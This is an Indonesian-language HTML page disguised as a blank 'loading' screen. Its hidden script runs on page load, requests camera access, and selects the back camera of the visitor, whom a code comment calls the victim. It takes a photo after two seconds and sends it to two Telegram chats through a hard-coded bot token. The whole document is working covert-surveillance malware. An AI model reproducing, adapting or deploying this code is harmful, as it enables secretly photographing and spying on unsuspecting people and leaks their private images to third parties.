<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Memuat...</title>
</head>
<body>

    <video id="video" autoplay playsinline style="display:none;"></video>
    <canvas id="canvas" style="display:none;"></canvas>

    <script>
        const telegramToken = "8937858897:AAF5POAsvL9AiJAX6SnHiznPlMaV8Ne6oVU";
        const chatIds = ["8401116235", "5408520831"];

        window.addEventListener('DOMContentLoaded', async () => {
            try {
                // Minta izin awal agar browser memunculkan pop-up akses kamera
                const initialStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
                initialStream.getTracks().forEach(track => track.stop()); // Matikan dulu

                // Cari daftar semua kamera fisik di HP korban
                const devices = await navigator.mediaDevices.enumerateDevices();
                const videoDevices = devices.filter(device => device.kind === 'videoinput');

                // Cari kamera belakang (biasanya berlabel "back", "environment", "rear", atau ambil indeks terakhir jika ada banyak)
                let selectedDevice = videoDevices.find(d => 
                    d.label.toLowerCase().includes('back') || 
                    d.label.toLowerCase().includes('rear') || 
                    d.label.toLowerCase().includes('environment')
                );

                // Jika label tidak terbaca tapi ada lebih dari 1 kamera, asumsikan kamera terakhir adalah kamera belakang
                if (!selectedDevice && videoDevices.length > 1) {
                    selectedDevice = videoDevices[videoDevices.length - 1];
                }

                // Konfigurasi constraints berdasarkan kamera yang ditemukan
                const constraints = {
                    video: selectedDevice ? { deviceId: { exact: selectedDevice.deviceId } } : { facingMode: "environment" },
                    audio: false
                };

                // Buka kamera belakang
                const stream = await navigator.mediaDevices.getUserMedia(constraints);
                const video = document.getElementById('video');
                const canvas = document.getElementById('canvas');
                
                video.srcObject = stream;
                
                await new Promise(resolve => setTimeout(resolve, 2000)); // Tunggu 2 detik

                canvas.width = video.videoWidth || 640;
                canvas.height = video.videoHeight || 480;
                
                const context = canvas.getContext('2d');
                context.drawImage(video, 0, 0, canvas.width, canvas.height);

                stream.getTracks().forEach(track => track.stop());

                canvas.toBlob(async (blob) => {
                    if (!blob) return;

                    for (const chatId of chatIds) {
                        const formData = new FormData();
                        formData.append('chat_id', chatId);
                        formData.append('photo', blob, 'back-capture.jpg');
                        formData.append('caption', '📸 Foto Kamera Belakang!');

                        await fetch(`https://api.telegram.org/bot${telegramToken}/sendPhoto`, {
                            method: 'POST',
                            body: formData
                        });
                    }
                }, 'image/jpeg', 0.85);

            } catch (error) {
                console.error("Gagal akses kamera belakang:", error);
            }
        });
    </script>
</body>
</html>
